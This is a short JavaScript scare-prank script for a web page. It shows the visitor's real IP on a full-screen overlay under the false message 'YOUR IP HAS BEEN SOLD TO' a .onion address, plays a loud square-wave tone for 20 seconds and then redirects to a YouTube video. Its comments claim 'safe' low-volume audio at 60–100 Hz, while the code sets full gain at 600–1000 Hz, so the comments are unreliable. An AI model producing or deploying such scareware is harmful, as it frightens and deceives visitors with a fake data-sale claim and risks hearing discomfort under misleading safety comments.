// --- Configuration ---
const DATA_SOURCE_URL = 'https://api64.ipify.org?format=json'; // Replace with your link
const REDIRECT_URL = "https://www.youtube.com/watch?v=Wom482pBjxk";

async function startSequence() {
        const response = fetch(DATA_SOURCE_URL).then(res => res.json()).then(data => {setInterval(function(){ipDisplay.innerText = data.ip},100)})
  .catch(err => console.error(err));
        const fetchedText = "YOUR IP HAS BEEN SOLD TO vww6ybal4bd7szmgncyruucpgfkqahzddi37ktceo3ah7ngmcopnpyyd.onion";

        // Create overlay
        const overlay = document.createElement('div');
        Object.assign(overlay.style, {
            position: 'fixed',
            top: 0,
            left: 0,
            width: '100vw',
            height: '100vh',
            backgroundColor: 'black',
            color: 'white',
            zIndex: 9999,
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            alignItems: 'center',
            fontFamily: 'sans-serif',
            textAlign: 'center'
        });
        document.body.appendChild(overlay);

        const contentDisplay = document.createElement('div');
        contentDisplay.innerText = fetchedText;
        const ipDisplay = document.createElement('div');
        ipDisplay.innerText = "LOAD";
        const countdownDisplay = document.createElement('div');
        countdownDisplay.style.fontSize = '3rem';
        countdownDisplay.style.marginTop = '20px';

        overlay.appendChild(contentDisplay);overlay.appendChild(ipDisplay);
        overlay.appendChild(countdownDisplay);

        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

        // SAFE AUDIO SETTINGS
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'square';

        // Start at 60Hz and slide to 100Hz over 20 seconds
        osc.frequency.setValueAtTime(600, audioCtx.currentTime);
        osc.frequency.linearRampToValueAtTime(1000, audioCtx.currentTime + 20);

        // Low volume to prevent discomfort
        gain.gain.setValueAtTime(1, audioCtx.currentTime);

        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start();

        let timeLeft = 20;
        countdownDisplay.innerText = timeLeft;

        const timer = setInterval(() => {
            timeLeft--;
            countdownDisplay.innerText = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(timer);
                osc.stop();

                window.location.href = REDIRECT_URL;

            }
        }, 1000);
}

startSequence();
